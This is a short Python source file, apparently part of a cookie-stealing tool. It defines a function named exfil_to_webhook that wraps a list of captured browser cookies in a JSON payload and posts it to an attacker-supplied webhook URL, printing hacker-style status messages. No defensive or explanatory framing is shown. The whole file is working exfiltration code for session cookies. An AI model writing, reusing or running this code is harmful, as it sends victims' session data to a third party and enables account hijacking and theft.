import requests, json

def exfil_to_webhook(cookies, webhook_url):
    if not cookies:
        print("[!] No cookies to exfiltrate.")
        return

    payload = {
        "cookies": cookies,
        "count": len(cookies),
        "session": True
    }

    headers = {"Content-Type": "application/json"}
    try:
        res = requests.post(webhook_url, headers=headers, data=json.dumps(payload))
        print(f"[+] Exfil complete: {res.status_code}")
    except Exception as e:
        print(f"[!] Exfil failed: {e}")
